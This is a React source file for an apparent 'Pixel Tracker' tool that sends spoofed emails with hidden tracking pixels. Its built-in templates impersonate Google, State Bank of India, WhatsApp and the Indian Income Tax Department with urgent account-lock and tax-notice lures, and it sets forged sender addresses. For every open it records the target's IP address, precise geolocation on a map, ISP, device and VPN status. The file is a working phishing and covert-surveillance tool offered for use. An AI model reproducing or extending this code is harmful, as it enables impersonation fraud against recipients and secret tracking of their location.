import React, { useState, useEffect } from "react";
import { useAuth } from "../contexts/AuthContext";
import { db } from "../firebase/config";
import { collection, query, where, onSnapshot } from "firebase/firestore";
import {
  Copy, CheckCircle, Eye, Globe, Mail, Plus,
  ChevronDown, ChevronUp, AlertCircle, Send, Shield
} from "lucide-react";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

const EMAIL_TEMPLATES = [
  {
    name: "Google Security",
    fromName: "Google Security",
    fromEmail: "security@accounts.google.com",
    subject: "⚠️ Suspicious sign-in attempt on your Google Account",
    body: (pixelUrl) => `<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:20px">
  <div style="text-align:center;margin-bottom:24px">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" width="120" alt="Google" />
  </div>
  <h2 style="color:#202124;font-size:20px">New sign-in to your Google Account</h2>
  <p style="color:#5f6368;font-size:14px">Your Google Account was just signed in from a new device:</p>
  <div style="background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px;margin:16px 0">
    <p style="margin:0;color:#202124;font-size:14px"><strong>Device:</strong> Unknown Device</p>
    <p style="margin:8px 0 0;color:#202124;font-size:14px"><strong>Location:</strong> Unknown Location</p>
    <p style="margin:8px 0 0;color:#202124;font-size:14px"><strong>Time:</strong> ${new Date().toLocaleString()}</p>
  </div>
  <p style="color:#5f6368;font-size:14px">If this was you, you can ignore this email. If not, secure your account immediately.</p>
  <div style="text-align:center;margin:24px 0">
    <a href="#" style="background:#1a73e8;color:#fff;padding:12px 32px;border-radius:4px;text-decoration:none;font-size:14px;font-weight:500">Review Activity</a>
  </div>
  <p style="color:#9aa0a6;font-size:12px;text-align:center">Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043</p>
  <img src="${pixelUrl}" width="1" height="1" border="0" alt="" style="display:none!important;visibility:hidden;width:1px;height:1px;" />
</div>`,
  },
  {
    name: "SBI Bank Alert",
    fromName: "SBI Security",
    fromEmail: "alerts@sbi.co.in",
    subject: "🔔 Alert: Your SBI account has been temporarily locked",
    body: (pixelUrl) => `<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:20px">
  <div style="background:#22409a;padding:16px;text-align:center;border-radius:8px 8px 0 0">
    <h2 style="color:#fff;margin:0;font-size:22px">State Bank of India</h2>
  </div>
  <div style="border:1px solid #ddd;border-top:none;padding:24px;border-radius:0 0 8px 8px">
    <p style="color:#d93025;font-weight:bold">⚠️ Security Alert</p>
    <p style="color:#333;font-size:14px">Dear Customer,</p>
    <p style="color:#333;font-size:14px">We have detected unusual activity on your account. Your account has been temporarily locked for your security.</p>
    <div style="text-align:center;margin:24px 0">
      <a href="#" style="background:#22409a;color:#fff;padding:12px 32px;border-radius:4px;text-decoration:none;font-size:14px;font-weight:500">Verify My Account</a>
    </div>
    <p style="color:#999;font-size:12px">Contact helpline: 1800-11-2211</p>
  </div>
  <img src="${pixelUrl}" width="1" height="1" border="0" alt="" style="display:none!important;visibility:hidden;width:1px;height:1px;" />
</div>`,
  },
  {
    name: "WhatsApp",
    fromName: "WhatsApp Support",
    fromEmail: "verify@whatsapp.com",
    subject: "Your WhatsApp account has been suspended",
    body: (pixelUrl) => `<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:20px">
  <div style="text-align:center;margin-bottom:20px">
    <div style="background:#25D366;width:60px;height:60px;border-radius:50%;margin:0 auto;line-height:60px;text-align:center">
      <span style="color:#fff;font-size:32px">✓</span>
    </div>
    <h2 style="color:#333;margin-top:12px">WhatsApp</h2>
  </div>
  <h3 style="color:#d93025;text-align:center">Account Suspended</h3>
  <p style="color:#555;font-size:14px;text-align:center">Your WhatsApp account has been suspended due to a violation of our Terms of Service.</p>
  <div style="text-align:center;margin:24px 0">
    <a href="#" style="background:#25D366;color:#fff;padding:12px 32px;border-radius:24px;text-decoration:none;font-size:14px;font-weight:600">Appeal & Restore Account</a>
  </div>
  <p style="color:#999;font-size:12px;text-align:center">Submit an appeal within 24 hours.</p>
  <img src="${pixelUrl}" width="1" height="1" border="0" alt="" style="display:none!important;visibility:hidden;width:1px;height:1px;" />
</div>`,
  },
  {
    name: "Income Tax",
    fromName: "Income Tax Department",
    fromEmail: "noreply@incometax.gov.in",
    subject: "Important: Income Tax Notice — Action Required",
    body: (pixelUrl) => `<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:20px">
  <div style="background:#1a3a5c;padding:16px;text-align:center;border-radius:8px 8px 0 0">
    <h2 style="color:#fff;margin:0;font-size:18px">Income Tax Department — Government of India</h2>
  </div>
  <div style="border:1px solid #ddd;border-top:none;padding:24px;border-radius:0 0 8px 8px">
    <p style="color:#d93025;font-weight:bold;font-size:15px">📋 Notice Under Section 142(1)</p>
    <p style="color:#333;font-size:14px">Dear Taxpayer,</p>
    <p style="color:#333;font-size:14px">Discrepancies have been identified in your Income Tax Return for AY 2024-25. You are required to submit your response within <strong>7 days</strong> to avoid penalty.</p>
    <div style="text-align:center;margin:24px 0">
      <a href="#" style="background:#1a3a5c;color:#fff;padding:12px 32px;border-radius:4px;text-decoration:none;font-size:14px;font-weight:500">Respond to Notice</a>
    </div>
    <p style="color:#999;font-size:11px">Helpline: 1800-103-0025</p>
  </div>
  <img src="${pixelUrl}" width="1" height="1" border="0" alt="" style="display:none!important;visibility:hidden;width:1px;height:1px;" />
</div>`,
  },
  {
    name: "Custom",
    fromName: "",
    fromEmail: "",
    subject: "",
    body: (pixelUrl) => `<div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px">
  <h2>Write your subject here</h2>
  <p>Write your email content here...</p>
  <a href="#" style="background:#333;color:#fff;padding:10px 24px;border-radius:4px;text-decoration:none">Click Here</a>
  <img src="${pixelUrl}" width="1" height="1" style="display:none" />
</div>`,
  },
];

export default function PixelTracker() {
  const { currentUser } = useAuth();
  const [pixels, setPixels] = useState([]);
  const [label, setLabel] = useState("");
  const [generating, setGenerating] = useState(false);
  const [createError, setCreateError] = useState("");
  const [createSuccess, setCreateSuccess] = useState("");
  const [copiedId, setCopiedId] = useState(null);
  const [openPixel, setOpenPixel] = useState(null);
  const [activeTab, setActiveTab] = useState({});
  const [emailState, setEmailState] = useState({});

  useEffect(() => {
    if (!currentUser) return;
    const q = query(collection(db, "pixelLinks"), where("uid", "==", currentUser.uid));
    const unsub = onSnapshot(q, (snap) => {
      const data = snap.docs.map(d => ({ id: d.id, ...d.data() }));
      data.sort((a, b) => (b.createdAt?.toMillis?.() ?? 0) - (a.createdAt?.toMillis?.() ?? 0));
      setPixels(data);
    });
    return unsub;
  }, [currentUser]);

  async function handleCreate(e) {
    e.preventDefault();
    if (!label.trim()) { setCreateError("Please enter a label"); return; }
    setGenerating(true); setCreateError(""); setCreateSuccess("");
    try {
      const res = await fetch(BACKEND_URL + "/api/links/pixel/create", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ uid: currentUser.uid, label: label.trim() }),
      });
      const data = await res.json();
      if (data.error) throw new Error(data.error);
      setCreateSuccess("Pixel created successfully!");
      setLabel("");
    } catch (err) {
      setCreateError(err.message || "Failed to create pixel");
    }
    setGenerating(false);
  }

  function copy(text, id) {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  }

  function getHtmlEmbed(pixelUrl) {
    return `<img src="${pixelUrl}" width="1" height="1" style="display:none" alt="" />`;
  }

  function getEmail(pixelId) {
    return emailState[pixelId] || {
      templateIdx: 0,
      fromName: EMAIL_TEMPLATES[0].fromName,
      fromEmail: EMAIL_TEMPLATES[0].fromEmail,
      toEmail: "",
      subject: EMAIL_TEMPLATES[0].subject,
      sending: false,
      error: "",
      success: "",
      showPreview: false,
    };
  }

  function setEmail(pixelId, updates) {
    setEmailState(prev => ({
      ...prev,
      [pixelId]: { ...getEmail(pixelId), ...updates },
    }));
  }

  function pickTemplate(pixelId, idx) {
    const t = EMAIL_TEMPLATES[idx];
    setEmail(pixelId, {
      templateIdx: idx,
      fromName: t.fromName,
      fromEmail: t.fromEmail,
      subject: t.subject,
    });
  }

  function getEmailBody(pixelId, pixelUrl) {
    const es = getEmail(pixelId);
    return EMAIL_TEMPLATES[es.templateIdx].body(pixelUrl);
  }

  async function handleSendEmail(pixelId, pixelUrl) {
    const es = getEmail(pixelId);
    if (!es.toEmail.trim()) { setEmail(pixelId, { error: "Enter target email address" }); return; }
    if (!es.subject.trim()) { setEmail(pixelId, { error: "Enter subject" }); return; }
    setEmail(pixelId, { sending: true, error: "", success: "" });
    try {
      const htmlBody = getEmailBody(pixelId, pixelUrl);
      const res = await fetch(BACKEND_URL + "/api/links/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          fromName: es.fromName,
          fromEmail: es.fromEmail,
          toEmail: es.toEmail,
          subject: es.subject,
          htmlBody,
        }),
      });
      const data = await res.json();
      if (data.error) throw new Error(data.error);
      setEmail(pixelId, {
        sending: false,
        success: `✅ Email sent to ${es.toEmail}! Opens will appear below in real time.`,
        toEmail: "",
      });
    } catch (err) {
      setEmail(pixelId, { sending: false, error: err.message || "Failed to send" });
    }
  }

  return (
    <div className="min-h-screen bg-surface pt-16 text-text-primary">
      <div className="max-w-5xl mx-auto px-4 py-8">

        <div className="mb-8">
          <h1 className="font-display text-4xl tracking-wider">PIXEL <span className="text-primary">TRACKER</span></h1>
          <p className="font-body text-sm text-text-secondary mt-1">
            Invisible tracking pixels — send tracking emails directly from here. Fires on open, no click needed.
          </p>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-3 gap-4 mb-8">
          {[
            { label: "Total Pixels", value: pixels.length, icon: <Eye className="w-4 h-4" /> },
            { label: "Total Opens", value: pixels.reduce((a, p) => a + (p.totalOpens || 0), 0), icon: <Mail className="w-4 h-4" /> },
            { label: "Unique IPs", value: pixels.reduce((a, p) => a + (p.uniqueIPs?.length || 0), 0), icon: <Globe className="w-4 h-4" /> },
          ].map(stat => (
            <div key={stat.label} className="bg-surface-card border border-surface-border rounded-xl p-4">
              <div className="flex items-center gap-2 text-text-muted mb-2">{stat.icon}<span className="font-body text-xs uppercase tracking-wider">{stat.label}</span></div>
              <div className="font-display text-3xl text-text-primary">{stat.value}</div>
            </div>
          ))}
        </div>

        {/* Create Pixel */}
        <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6 mb-6">
          <h2 className="font-display text-xl tracking-wider mb-1">CREATE <span className="text-primary">PIXEL</span></h2>
          <p className="font-body text-xs text-text-muted mb-5">Free — no credits needed. Each pixel gets its own email sender below.</p>

          {createError && (
            <div className="flex items-center gap-2 bg-red-500/10 border border-red-500/30 text-red-400 rounded-lg px-3 py-2.5 font-body text-sm mb-4">
              <AlertCircle className="w-4 h-4 flex-shrink-0" />{createError}
            </div>
          )}
          {createSuccess && (
            <div className="flex items-center gap-2 bg-green-500/10 border border-green-500/30 text-green-400 rounded-lg px-3 py-2.5 font-body text-sm mb-4">
              <CheckCircle className="w-4 h-4 flex-shrink-0" />{createSuccess}
            </div>
          )}

          <form onSubmit={handleCreate} className="flex flex-col md:flex-row gap-3">
            <input
              type="text"
              value={label}
              onChange={e => setLabel(e.target.value)}
              placeholder="Label — e.g. Invoice Email, SBI Campaign, Test"
              className="flex-1 bg-surface border border-surface-border rounded-xl px-4 py-3.5 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
            />
            <button
              type="submit"
              disabled={generating}
              className="px-6 py-3.5 bg-primary text-surface font-body font-bold rounded-xl hover:bg-primary-dark transition-all shadow-glow disabled:opacity-50 flex items-center gap-2 whitespace-nowrap"
            >
              <Plus className="w-4 h-4" />
              {generating ? "Creating..." : "Create Pixel"}
            </button>
          </form>
        </div>

        {/* Pixel List */}
        <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6">
          <h2 className="font-display text-xl tracking-wider mb-6">YOUR <span className="text-primary">PIXELS</span></h2>

          {pixels.length === 0 ? (
            <div className="text-center py-16">
              <div className="text-5xl mb-4">👁️</div>
              <p className="font-body text-text-muted">No pixels yet — create one above</p>
              <p className="font-body text-xs text-text-muted mt-1">Free, no credits needed</p>
            </div>
          ) : (
            <div className="space-y-4">
              {pixels.map(pixel => {
                const es = getEmail(pixel.id);
                const emailBody = getEmailBody(pixel.id, pixel.pixelUrl);

                return (
                  <div key={pixel.id} className="bg-surface border border-surface-border rounded-2xl overflow-hidden">

                    {/* Pixel header */}
                    <div
                      className="p-5 flex items-center justify-between gap-3 cursor-pointer hover:bg-primary/5 transition-all"
                      onClick={() => setOpenPixel(openPixel === pixel.id ? null : pixel.id)}
                    >
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-1">
                          <span className="font-body text-base font-semibold">{pixel.label}</span>
                          {(pixel.totalOpens || 0) > 0 && (
                            <span className="text-xs px-2 py-0.5 rounded-full bg-green-500/10 text-green-400 border border-green-500/20 font-mono animate-pulse">● LIVE</span>
                          )}
                        </div>
                        <div className="font-mono text-xs text-text-muted truncate">{pixel.pixelUrl}</div>
                      </div>
                      <div className="flex items-center gap-4 flex-shrink-0">
                        <div className="text-center">
                          <div className="font-display text-2xl text-primary">{pixel.totalOpens || 0}</div>
                          <div className="font-body text-xs text-text-muted">opens</div>
                        </div>
                        <div className="text-center">
                          <div className="font-display text-2xl text-primary">{pixel.uniqueIPs?.length || 0}</div>
                          <div className="font-body text-xs text-text-muted">unique</div>
                        </div>
                        {openPixel === pixel.id ? <ChevronUp className="w-5 h-5 text-text-muted" /> : <ChevronDown className="w-5 h-5 text-text-muted" />}
                      </div>
                    </div>

                    {openPixel === pixel.id && (
                      <div className="border-t border-surface-border p-5 space-y-6">

                        {/* ── EMBED CODES ── */}
                        <div>
                          <p className="font-body text-xs text-primary uppercase tracking-wider mb-3">📋 Manual Embed Codes</p>
                          <div className="flex gap-2 mb-3">
                            {["url", "html"].map(tab => (
                              <button key={tab}
                                onClick={() => setActiveTab(t => ({ ...t, [pixel.id]: tab }))}
                                className={`px-3 py-1.5 rounded-lg font-body text-xs transition-colors ${(activeTab[pixel.id] || "url") === tab ? "bg-primary text-surface font-bold" : "bg-surface border border-surface-border text-text-muted hover:border-primary/40"}`}>
                                {tab === "url" ? "🔗 Plain URL" : "📄 HTML Code"}
                              </button>
                            ))}
                          </div>
                          <div className="relative">
                            <pre className="bg-surface border border-surface-border rounded-xl p-4 font-mono text-xs text-green-400 overflow-x-auto whitespace-pre-wrap break-all">
                              {(activeTab[pixel.id] || "url") === "url" ? pixel.pixelUrl : getHtmlEmbed(pixel.pixelUrl)}
                            </pre>
                            <button
                              onClick={() => copy((activeTab[pixel.id] || "url") === "url" ? pixel.pixelUrl : getHtmlEmbed(pixel.pixelUrl), pixel.id + "-code")}
                              className="absolute top-3 right-3 flex items-center gap-1.5 px-3 py-1.5 bg-surface-border rounded-lg font-body text-xs hover:bg-primary/20 transition-colors">
                              {copiedId === pixel.id + "-code" ? <><CheckCircle className="w-3 h-3 text-green-400" /> Copied!</> : <><Copy className="w-3 h-3" /> Copy</>}
                            </button>
                          </div>
                          <p className="font-body text-xs text-text-muted mt-1.5">
                            {(activeTab[pixel.id] || "url") === "url"
                              ? "Gmail → Compose → Insert photo → Web address → paste URL"
                              : "Paste inside email HTML body — fires silently on open"}
                          </p>
                        </div>

                        {/* ── EMAIL SENDER (built in) ── */}
                        <div className="bg-surface-card border border-primary/30 rounded-2xl p-5">
                          <div className="flex items-center justify-between mb-5">
                            <div className="flex items-center gap-2">
                              <Send className="w-4 h-4 text-primary" />
                              <p className="font-display text-base tracking-wider">SEND TRACKING <span className="text-primary">EMAIL</span></p>
                            </div>
                            <div className="flex items-center gap-1.5 bg-green-500/10 border border-green-500/20 rounded-lg px-3 py-1.5">
                              <Shield className="w-3 h-3 text-green-400" />
                              <span className="font-body text-xs text-green-400">Pixel auto-embedded</span>
                            </div>
                          </div>

                          {/* Template selector */}
                          <div className="mb-4">
                            <label className="font-body text-xs text-text-muted uppercase tracking-wider mb-2 block">Choose Template</label>
                            <div className="grid grid-cols-2 md:grid-cols-5 gap-2">
                              {EMAIL_TEMPLATES.map((t, i) => (
                                <button key={i}
                                  onClick={() => pickTemplate(pixel.id, i)}
                                  className={`py-2.5 px-3 rounded-xl border font-body text-xs text-center transition-all ${es.templateIdx === i ? "border-primary bg-primary/10 text-primary font-semibold" : "border-surface-border text-text-muted hover:border-primary/40"}`}>
                                  {t.name}
                                </button>
                              ))}
                            </div>
                          </div>

                          {/* From / To fields */}
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
                            <div>
                              <label className="font-body text-xs text-text-muted uppercase tracking-wider mb-1.5 block">
                                Display Name <span className="text-primary">(target sees this as sender)</span>
                              </label>
                              <input
                                value={es.fromName}
                                onChange={e => setEmail(pixel.id, { fromName: e.target.value })}
                                placeholder="e.g. Google Security, SBI Bank"
                                className="w-full bg-surface border border-surface-border rounded-xl px-4 py-3 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
                              />
                            </div>
                            <div>
                              <label className="font-body text-xs text-text-muted uppercase tracking-wider mb-1.5 block">
                                Fake From Email <span className="text-text-muted">(reply-to)</span>
                              </label>
                              <input
                                value={es.fromEmail}
                                onChange={e => setEmail(pixel.id, { fromEmail: e.target.value })}
                                placeholder="e.g. security@google.com"
                                className="w-full bg-surface border border-surface-border rounded-xl px-4 py-3 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
                              />
                            </div>
                            <div>
                              <label className="font-body text-xs text-text-muted uppercase tracking-wider mb-1.5 block">Subject Line</label>
                              <input
                                value={es.subject}
                                onChange={e => setEmail(pixel.id, { subject: e.target.value })}
                                placeholder="Email subject"
                                className="w-full bg-surface border border-surface-border rounded-xl px-4 py-3 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
                              />
                            </div>
                            <div>
                              <label className="font-body text-xs text-text-muted uppercase tracking-wider mb-1.5 block">
                                Target Email <span className="text-primary">(send to)</span>
                              </label>
                              <input
                                value={es.toEmail}
                                onChange={e => setEmail(pixel.id, { toEmail: e.target.value })}
                                placeholder="target@email.com"
                                className="w-full bg-surface border border-surface-border rounded-xl px-4 py-3 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
                              />
                            </div>
                          </div>

                          {/* Preview toggle */}
                          <div className="mb-4">
                            <button
                              onClick={() => setEmail(pixel.id, { showPreview: !es.showPreview })}
                              className="font-body text-xs text-primary hover:underline flex items-center gap-1.5 mb-2"
                            >
                              <Eye className="w-3.5 h-3.5" />
                              {es.showPreview ? "Hide email preview" : "Show email preview"}
                            </button>
                            {es.showPreview && (
                              <div className="border border-surface-border rounded-xl overflow-hidden" style={{ height: 320 }}>
                                <iframe
                                  title={`preview-${pixel.id}`}
                                  srcDoc={emailBody}
                                  style={{ width: "100%", height: "100%", border: "none", background: "#fff" }}
                                />
                              </div>
                            )}
                          </div>

                          {/* Error / Success */}
                          {es.error && (
                            <div className="flex items-center gap-2 bg-red-500/10 border border-red-500/30 text-red-400 rounded-lg px-3 py-2.5 font-body text-sm mb-3">
                              <AlertCircle className="w-4 h-4 flex-shrink-0" />{es.error}
                            </div>
                          )}
                          {es.success && (
                            <div className="flex items-center gap-2 bg-green-500/10 border border-green-500/30 text-green-400 rounded-lg px-3 py-2.5 font-body text-sm mb-3">
                              <CheckCircle className="w-4 h-4 flex-shrink-0" />{es.success}
                            </div>
                          )}

                          {/* Send button */}
                          <button
                            onClick={() => handleSendEmail(pixel.id, pixel.pixelUrl)}
                            disabled={es.sending}
                            className="w-full px-6 py-4 bg-primary text-surface font-body font-bold rounded-xl hover:bg-primary-dark transition-all shadow-glow disabled:opacity-50 flex items-center justify-center gap-2 text-base"
                          >
                            <Send className="w-5 h-5" />
                            {es.sending ? "Sending..." : "Send Tracking Email"}
                          </button>
                          <p className="font-body text-xs text-text-muted mt-2 text-center">
                            Target sees <strong className="text-primary">{es.fromName || "your display name"}</strong> as sender — not your real email
                          </p>
                        </div>

                        {/* ── HIT LOG ── */}
                        {pixel.hits?.length > 0 ? (
                          <div>
                            <p className="font-body text-xs text-primary uppercase tracking-wider mb-3 pb-1.5 border-b border-surface-border">
                              📬 {pixel.hits.length} Open{pixel.hits.length > 1 ? "s" : ""} — latest first
                            </p>
                            <div className="space-y-3 max-h-[600px] overflow-y-auto">
                              {[...pixel.hits].reverse().map((hit, i) => (
                                <div key={i} className="bg-surface-card border border-surface-border rounded-2xl p-4">
                                  {/* Hit header */}
                                  <div className="flex items-start justify-between gap-3 mb-3 flex-wrap">
                                    <div className="flex items-center gap-2 flex-wrap">
                                      <span className="font-body text-sm font-semibold text-text-primary">
                                        Open #{pixel.hits.length - i} &nbsp;·&nbsp; {hit.emailClient || "Unknown"}
                                      </span>
                                      {hit.isRepeatOpen && <span className="text-xs px-2 py-0.5 rounded-full bg-yellow-500/10 text-yellow-400 border border-yellow-500/20 font-mono">🔁 Repeat</span>}
                                      {hit.isForwarded && <span className="text-xs px-2 py-0.5 rounded-full bg-blue-500/10 text-blue-400 border border-blue-500/20 font-mono">↗ Forwarded</span>}
                                      {hit.isProxy && <span className="text-xs px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 font-mono">🛡 VPN</span>}
                                      {hit.isMobileNetwork && <span className="text-xs px-2 py-0.5 rounded-full bg-purple-500/10 text-purple-400 border border-purple-500/20 font-mono">📱 Mobile</span>}
                                    </div>
                                    <div className="text-right flex-shrink-0">
                                      <div className="font-mono text-xs text-text-muted">{hit.openedAt ? new Date(hit.openedAt).toLocaleString("en-IN") : ""}</div>
                                      {hit.timezone && <div className="font-mono text-xs text-text-muted">{hit.timezone}</div>}
                                    </div>
                                  </div>

                                  {/* IP Location Map */}
                                  {hit.lat && hit.lon && (
                                    <div className="mb-3 rounded-xl overflow-hidden border border-surface-border" style={{ height: 200 }}>
                                      <iframe
                                        title={`map-${i}`}
                                        src={`https://maps.google.com/maps?q=${hit.lat},${hit.lon}&z=13&output=embed`}
                                        width="100%" height="100%"
                                        style={{ border: 0, display: "block" }}
                                        allowFullScreen
                                        loading="lazy"
                                      />
                                    </div>
                                  )}

                                  {/* All details grid */}
                                  <div className="grid grid-cols-2 gap-x-6 gap-y-2.5">
                                    <HitRow label="IP Address" value={hit.ip} />
                                    <HitRow label="Email Client" value={hit.emailClient} />
                                    <HitRow label="Country" value={hit.country ? `${hit.country}${hit.countryCode ? ` (${hit.countryCode})` : ""}` : null} />
                                    <HitRow label="Region" value={hit.region} />
                                    <HitRow label="City" value={hit.city} />
                                    <HitRow label="ZIP / Pincode" value={hit.zip} />
                                    <HitRow label="Coordinates" value={hit.lat && hit.lon ? `${hit.lat}, ${hit.lon}` : null} />
                                    <HitRow label="Timezone" value={hit.timezone} />
                                    <HitRow label="ISP" value={hit.isp} />
                                    <HitRow label="Organisation" value={hit.org} />
                                    <HitRow label="ASN" value={hit.asn} />
                                    <HitRow label="Proxy / VPN" value={hit.isProxy != null ? String(hit.isProxy) : null} />
                                    <HitRow label="Hosting / VPS" value={hit.isHosting != null ? String(hit.isHosting) : null} />
                                    <HitRow label="Mobile Network" value={hit.isMobileNetwork != null ? String(hit.isMobileNetwork) : null} />
                                    <HitRow label="OS" value={hit.os} />
                                    <HitRow label="Device" value={hit.device} />
                                    <HitRow label="Browser" value={hit.browser} />
                                    <HitRow label="Accept Language" value={hit.acceptLanguage} />
                                    <HitRow label="Referrer" value={hit.referer} />
                                    <div className="col-span-2">
                                      <HitRow label="User Agent" value={hit.userAgent} />
                                    </div>
                                  </div>

                                  {/* Map buttons */}
                                  {hit.lat && hit.lon && (
                                    <div className="flex gap-2 mt-3">
                                      <a href={`https://www.google.com/maps?q=${hit.lat},${hit.lon}`} target="_blank" rel="noreferrer"
                                        className="flex items-center gap-1.5 px-3 py-2 bg-surface border border-surface-border rounded-lg font-body text-xs text-primary hover:bg-primary/10 transition-colors">
                                        <Globe className="w-3.5 h-3.5" /> Google Maps
                                      </a>
                                      <a href={`https://maps.apple.com/?q=${hit.lat},${hit.lon}`} target="_blank" rel="noreferrer"
                                        className="flex items-center gap-1.5 px-3 py-2 bg-surface border border-surface-border rounded-lg font-body text-xs text-text-primary hover:bg-primary/10 transition-colors">
                                        🗺️ Apple Maps
                                      </a>
                                    </div>
                                  )}
                                </div>
                              ))}
                            </div>
                          </div>
                        ) : (
                          <div className="text-center py-10 border border-dashed border-surface-border rounded-xl">
                            <div className="text-4xl mb-3">📭</div>
                            <p className="font-body text-sm text-text-muted">No opens yet</p>
                            <p className="font-body text-xs text-text-muted mt-1">Send the tracking email above — opens appear here in real time</p>
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function HitRow({ label, value }) {
  if (value == null || value === "" || value === "null" || value === "undefined") return null;
  return (
    <div>
      <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-0.5">{label}</div>
      <div className="font-mono text-xs text-text-primary break-all">{String(value)}</div>
    </div>
  );
}
